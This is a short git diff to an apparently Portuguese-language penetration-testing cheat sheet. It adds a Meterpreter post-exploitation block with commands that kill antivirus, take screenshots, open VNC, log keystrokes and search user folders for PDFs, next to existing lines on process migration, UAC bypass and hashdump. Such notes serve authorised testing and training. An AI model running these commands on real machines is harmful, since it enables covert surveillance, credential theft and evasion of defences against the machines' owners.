@@ -60,10 +60,18 @@ ps
 getpid e depois migrate id_de_outro_processo_para_persisntecia
 bypass de UAC
 hashdump
-
-
-
 ```
+### Meterpreter Persistence
+
+```bash
+run killav
+screenshot
+run vnc
+keyscan_start
+keyscan_dump
+search -d C:/Users -f .pdf
+```
+
 
 ### 🔐 Permissões Sudo
 Verifique permissões do usuário:
